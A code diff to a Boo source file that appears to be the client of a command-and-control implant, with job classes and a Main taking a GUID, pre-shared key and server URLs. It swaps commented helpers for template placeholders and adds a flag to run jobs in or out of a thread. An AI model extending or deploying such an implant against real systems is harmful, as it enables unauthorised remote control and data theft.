@@ -19,18 +19,7 @@ import Boo.Lang.Compiler.Pipelines
 import Microsoft.VisualBasic.Devices
 import Microsoft.Win32
 
-/*
-public static def MyResolveEventHandler(sender as object, args as ResolveEventArgs) as Assembly:
-    print("Trying to resolve $(args.Name).dll")
-    result = [asm for asm in AppDomain.CurrentDomain.GetAssemblies()].Find() do (item as Assembly):
-        return @/,/.Split(item.ToString())[0] == args.Name
-
-    if result:
-        print("Found assembly $(result)")
-        return result
-
-    return result
-*/
+ASSEMBLY_RESOLVE_EVENT_HANDLER_GOES_HERE
 
 public def urljoin(*args) as string:
     t = map(args) def (arg as object):
@@ -52,14 +41,6 @@ public def Hex2Binary(hex as string) as (byte):
 
     return bytes.ToArray()
 
-/*
-public static def GetFileChunk(bytes_read as (byte)) as (byte):
-    #using dest_stream = File.Create("$(f_number).chunk"):
-    using dest_stream = MemoryStream():
-        dest_stream.Write(bytes_read, 0, bytes_read.Length)
-        return dest_stream.ToArray()
-*/
-
 class CryptoException(Exception):
     def constructor(message):
         super(message)
@@ -76,6 +57,7 @@ class Args:
     public args as List
     public source as string
     public references as List
+    public run_in_thread as bool = true
 
 class JsonJob:
     public id as string
@@ -242,12 +224,15 @@ class STJob:
         Client = client
         Job = job
 
-        id = job.id
+        id = Job.id
         cmd = Job.cmd
         if Client.Debug:
             print id, cmd
 
-        Start.BeginInvoke(null, null)
+        if Job.args.run_in_thread:
+            Start.BeginInvoke(null, null)
+        else:
+            Start()
 
     /*
         type = self.GetType()
@@ -540,8 +525,7 @@ class STClient:
             #Thread.Sleep(GetSleepAndJitter())
 
 public static def Main(argv as (string)):
-     #AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)
-
+    ASSEMBLY_RESOLVE_HOOK_GOES_HERE
     client = STClient(Guid: Guid(argv[0]), PSK: argv[1], Urls: @/,/.Split(argv[2]))
     #client.Jobs.Add(STJob(JsonJob(id: "test", cmd: "Upload"), client))
     client.Start()
